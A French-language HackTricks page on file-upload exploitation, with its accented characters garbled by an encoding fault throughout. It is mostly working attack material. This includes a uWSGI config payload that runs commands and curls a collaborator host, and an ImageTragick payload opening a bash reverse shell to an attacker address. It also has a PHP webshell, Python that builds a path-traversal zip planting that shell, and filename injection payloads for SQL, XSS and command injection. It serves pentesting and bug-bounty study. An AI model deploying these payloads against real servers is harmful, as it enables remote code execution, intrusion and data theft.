# T√©l√©chargement de fichiers

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Astuce de chasse aux bogues de primes** : **inscrivez-vous** sur **Intigriti**, une **plateforme de primes de bogues premium cr√©√©e par des pirates informatiques, pour les pirates informatiques** !
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Lorsque le fichier de **configuration** sera **analys√©**, la **charge utile** sera **ex√©cut√©e**. Notez que pour que la configuration soit analys√©e, le **processus doit √™tre red√©marr√©** (plantage ? DoS ?) ou le fichier **recharg√© automatiquement** (une option qui pourrait √™tre utilis√©e indique les secondes pour recharger le fichier si une modification est trouv√©e).

**Note importante :** L'analyse du fichier de configuration de uWSGI est laxiste. La charge utile pr√©c√©dente peut √™tre int√©gr√©e dans un fichier binaire (par exemple, une image, un pdf, ...).

## **Astuce de t√©l√©chargement de fichier wget/SSRF**

Dans certains cas, vous pouvez constater qu'un serveur utilise **`wget`** pour **t√©l√©charger des fichiers** et vous pouvez **indiquer** l'**URL**. Dans ces cas, le code peut v√©rifier que l'extension des fichiers t√©l√©charg√©s est dans une liste blanche pour s'assurer que seuls les fichiers autoris√©s seront t√©l√©charg√©s. Cependant, **cette v√©rification peut √™tre contourn√©e**.\
La **longueur maximale** d'un **nom de fichier** sous **Linux** est de **255**, cependant, **wget** tronque les noms de fichiers √† **236** caract√®res. Vous pouvez **t√©l√©charger un fichier appel√© "A"\*232+".php"+".gif"**, ce nom de fichier **contournera** la **v√©rification** (comme dans cet exemple **".gif"** est une extension **valide**) mais `wget` renommera le fichier en **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Notez que **une autre option** √† laquelle vous pourriez penser pour contourner cette v√©rification est de faire **rediriger le serveur HTTP vers un fichier diff√©rent**, de sorte que l'URL initiale contourne la v√©rification, puis wget t√©l√©chargera le fichier redirig√© avec le nouveau nom. Cela **ne fonctionnera pas** **√† moins que** wget ne soit utilis√© avec le **param√®tre** `--trust-server-names` car **wget t√©l√©chargera la page redirig√©e avec le nom du fichier indiqu√© dans l'URL d'origine**.

#### Autres ressources

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

## De l'upload de fichiers √† d'autres vuln√©rabilit√©s

* D√©finissez le **nom de fichier** sur `../../../tmp/lol.png` et essayez d'obtenir une **traversal de chemin**
* D√©finissez le **nom de fichier** sur `sleep(10)-- -.jpg` et vous pourriez √™tre en mesure d'obtenir une **injection SQL**
* D√©finissez le **nom de fichier** sur `<svg onload=alert(document.domain)>` pour obtenir une XSS
* D√©finissez le **nom de fichier** sur `; sleep 10;` pour tester une injection de commande (plus de [trucs d'injection de commande ici](../command-injection.md))
* [**XSS** dans le t√©l√©chargement de fichiers image (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* T√©l√©chargement de fichier **JS** + **XSS** = exploitation de [**Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE dans le t√©l√©chargement de fichiers svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirection ouverte** via le t√©l√©chargement de fichiers svg](../open-redirect.md#open-redirect-uploading-svg-files)
* Essayez **diff√©rentes charges utiles svg** √† partir de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Fameuse vuln√©rabilit√© **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Si vous pouvez **indiquer au serveur Web de capturer une image √† partir d'une URL**, vous pouvez essayer d'abuser d'un [SSRF](../ssrf-server-side-request-forgery/). Si cette **image** doit √™tre **enregistr√©e** sur un site **public**, vous pouvez √©galement indiquer une URL √† partir de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) et **voler des informations de chaque visiteur**.
* [**XXE et CORS** contournement avec t√©l√©chargement de PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* PDF sp√©cialement con√ßus pour XSS: La [page suivante pr√©sente comment **injecter des donn√©es PDF pour obtenir une ex√©cution JS**](../xss-cross-site-scripting/pdf-injection.md). Si vous pouvez t√©l√©charger des PDF, vous pouvez pr√©parer un PDF qui ex√©cutera un JS arbitraire en suivant les indications donn√©es.
* T√©l√©chargez le contenu de \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) pour v√©rifier si le serveur dispose d'un **antivirus**
* V√©rifiez s'il y a une **limite de taille** pour t√©l√©charger des fichiers

Voici une liste des 10 choses que vous pouvez r√©aliser en t√©l√©chargeant des fichiers (√† partir de [lien](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: Injection CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : Injection HTML / XSS / Redirection ouverte
8. **PNG / JPEG**: Attaque de flood de pixels (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Extension Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## En-t√™tes magiques

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Reportez-vous √† [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) pour d'autres types de fichiers.

### T√©l√©chargement automatique de fichiers Zip/Tar d√©compress√©s

Si vous pouvez t√©l√©charger un ZIP qui va √™tre d√©compress√© √† l'int√©rieur du serveur, vous pouvez faire 2 choses:

#### Lien symbolique

T√©l√©chargez un lien contenant des liens symboliques vers d'autres fichiers, puis, en acc√©dant aux fichiers d√©compress√©s, vous acc√©derez aux fichiers li√©s:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### D√©compression dans diff√©rents dossiers

Les fichiers d√©compress√©s seront cr√©√©s dans des dossiers inattendus.

On pourrait facilement supposer que cette configuration prot√®ge contre l'ex√©cution de commandes au niveau du syst√®me d'exploitation via des t√©l√©chargements de fichiers malveillants, mais malheureusement ce n'est pas vrai. √âtant donn√© que le format d'archive ZIP prend en charge la compression hi√©rarchique et que nous pouvons √©galement faire r√©f√©rence √† des r√©pertoires de niveau sup√©rieur, nous pouvons nous √©chapper du r√©pertoire de t√©l√©chargement s√©curis√© en abusant de la fonction de d√©compression de l'application cible.

Une exploitation automatis√©e pour cr√©er ce type de fichiers peut √™tre trouv√©e ici: [**https://github.com/ptoomey3/evilarc**](https://github.com/ptoomey3/evilarc)
```python
python2 evilarc.py -h
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Vous pouvez √©galement utiliser le **truc du lien symbolique avec evilarc**, si le drapeau se trouve dans `/flag.txt`, assurez-vous de cr√©er un **lien symbolique vers ce fichier** et de **cr√©er ce fichier dans votre syst√®me** afin que lorsque vous appelez evilarc, il ne **renvoie pas d'erreur**.

Voici du code Python pour cr√©er une archive zip malveillante:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
    z.writestr('otherfile.xml', 'Content of the file')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 

create_zip()
```
Pour r√©aliser l'ex√©cution de commande √† distance, j'ai suivi les √©tapes suivantes :

1. Cr√©er un shell PHP :
```php
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>
```
1. Utilisez la technique de "file spraying" et cr√©ez un fichier zip compress√© :
```
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
  adding: xxAcmd.php (deflated 40%)
  adding: xxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. Utilisez un √©diteur hexad√©cimal ou vi et changez "xxA" en "../", j'ai utilis√© vi:
```
:set modifiable
:%s/xxA/..\//g
:x!
```
Il ne reste plus qu'une √©tape : t√©l√©charger le fichier ZIP et laisser l'application le d√©compresser ! Si cela r√©ussit et que le serveur web dispose de suffisamment de privil√®ges pour √©crire dans les r√©pertoires, il y aura un simple shell d'ex√©cution de commandes OS sur le syst√®me :

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**R√©f√©rence** : [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## ImageTragic

T√©l√©chargez ce contenu avec une extension d'image pour exploiter la vuln√©rabilit√© **(ImageMagick, 7.0.1-1)**.
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Int√©gration d'un shell PHP dans une image PNG

La raison principale de la mise en place d'un shell web dans le chunk IDAT est qu'il a la capacit√© de contourner les op√©rations de redimensionnement et de r√©√©chantillonnage - PHP-GD contient deux fonctions pour cela [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) et [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

Lisez cet article: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Fichiers polyglottes

Les polyglottes, dans un contexte de s√©curit√©, sont des fichiers qui sont une forme valide de plusieurs types de fichiers diff√©rents. Par exemple, un [GIFAR](https://en.wikipedia.org/wiki/Gifar) est √† la fois un fichier GIF et un fichier RAR. Il existe √©galement des fichiers qui peuvent √™tre √† la fois GIF et JS, √† la fois PPT et JS, etc.

Les fichiers polyglottes sont souvent utilis√©s pour contourner la protection bas√©e sur les types de fichiers. De nombreuses applications qui permettent aux utilisateurs de t√©l√©charger des fichiers n'autorisent que le t√©l√©chargement de certains types, tels que JPEG, GIF, DOC, afin d'emp√™cher les utilisateurs de t√©l√©charger des fichiers potentiellement dangereux tels que des fichiers JS, des fichiers PHP ou des fichiers Phar.

Cela permet de t√©l√©charger un fichier qui est conforme au format de plusieurs formats diff√©rents. Cela peut vous permettre de t√©l√©charger un fichier PHAR (PHp ARchive) qui ressemble √©galement √† un JPEG, mais vous aurez probablement toujours besoin d'une extension valide et si la fonction de t√©l√©chargement ne le permet pas, cela ne vous aidera pas.

Plus d'informations sur: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug**: **inscrivez-vous** √† **Intigriti**, une plateforme de prime de bug premium cr√©√©e par des pirates informatiques, pour les pirates informatiques! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©**? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks**? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
